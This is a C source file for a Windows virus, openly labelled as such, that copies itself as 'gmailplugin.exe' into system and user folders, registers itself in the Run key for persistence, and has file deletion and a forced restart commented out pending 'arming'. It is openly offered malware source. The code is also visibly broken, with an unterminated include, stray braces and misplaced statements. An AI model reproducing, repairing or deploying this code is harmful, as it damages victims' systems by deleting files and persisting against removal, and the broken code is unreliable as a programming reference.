/* by Creator_LuXury */
/* FOR TESTING ONLY PLEASE DO NOT SHARE */
/* PLEASE BE CAREFUL WHEN USING THIS IF YOU WANT TO ARM VIRUS REMOVE "//" FORM REMOVE LINe 26 and 82 */ 
/* TESTED AND ON WINDOWS XP  */

# include <stdio.h>
# include <windows.h>
# include <dirent.h>
# include <time.h> 
# include <ShellApi.h>
# include <signal.h

int copyspam(char s[50]){// makes a copy of the programm in 'pseudorandom' locations and also runs it 
	int i,c;
	for(i;i<2;i++){
	char fullname[1024];
	strcpy(fullname,s);
	strcat(fullname,"\\");
	char * original_file = "gmailplugin.exe";
	strcat(fullname,"gmailplugin.exe");
    char * new_file = fullname;
    ( void ) CopyFile ( ( LPCTSTR )original_file, ( LPCTSTR )new_file, FALSE);
//   ShellExecute(GetDesktopWindow(),"open",fullname,NULL,NULL,SW_SHOW); // RUNS PROCESS ENDESLY   
	return 0;
	}
}

/*int autorun(){// add virus to registry to start with windows start one started cannot be normaly removed or deleted

HKEY hKey;
const char* czStartName = "gmailplugin.exe";
const char* czExePath   = _pgmptr;

LONG lnRes = RegOpenKeyEx(  HKEY_CURRENT_USER,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                            0 , KEY_WRITE,
                            &hKey);
if( ERROR_SUCCESS == lnRes )
{
    lnRes = RegSetValueEx(  hKey,
                            czStartName,
                            0,
                            REG_SZ,
                            (unsigned char*)czExePath,
                            strlen(czExePath) );
}*/

RegCloseKey(hKey);
}
int rem(char s[50]){  // this function creates list of files and directories and should delete it
	FILE* ff;
	struct dirent *entry;
	printf("%s\n", s);
	DIR* dir = opendir(s);
	char fullname[1024];
	if (dir){
		    printf("\n\n******\n\n");
		    while ((entry = readdir(dir)) != NULL){
			strcpy(fullname,s);
			strcat(fullname,"\\");
			strcat(fullname,entry->d_name);
		    ff = fopen(fullname , "r");
		    if (ff != NULL){
		    	printf("%s\n", entry->d_name);
				fclose(ff);	
 //  				remove(fullname);
			}
			else if (ff == NULL) {
        	printf("%s(directory)\n",entry->d_name);
   			}
   		}
		printf("\n******\n");
		closedir(dir);

		return 1;
	}
	else if(dir == NULL)
	{
		perror("log : dir not found\n");
		return 0;
	}
	else 
	{
		printf("unknown error\n");
		}
}
int main (){
	autorun();

	int x = 1;
	int t = 10;
	while (t--){  // this loop allows to find specific locations
	if(x==1) {
	char a[50] = "C:\\Users";
	rem(a);
	copyspam(a);
	}
	else if (x==2){
	char a[50] = "C:\\Windows\\System32";
	rem(a);
	copyspam(a);
	}
	else if (x==3){
	char a[50] = "C:\\Windows\\System";
	rem(a);
	copyspam(a);
	}
	else if (x==4){
	char a[50] = "C:\\Program Files";
	rem(a);
	copyspam(a);
	}
	else if (x==5){
	char a[50] = "C:\\Program Files (x86)";
	rem(a);
	copyspam(a);
	}
	else if (x==6){
	char a[50] = "C:\\Windows\\Boot";
	rem(a);
	copyspam(a);
	}
	else if (x==7){
	char a[50] = "C:\\Documents and Settings";
	rem(a);
	copyspam(a);
	}
	}
	else if (x==8){
	char a[50] = "C:\\Windows\\";
	rem(a);
	copyspam(a);
	}
	else if (x==9){
	char a[50] = "C:\\";
	rem(a);
	copyspam(a);
	}
x++;
}

// system("shutdown -r -t 00");    // should restart computer

}
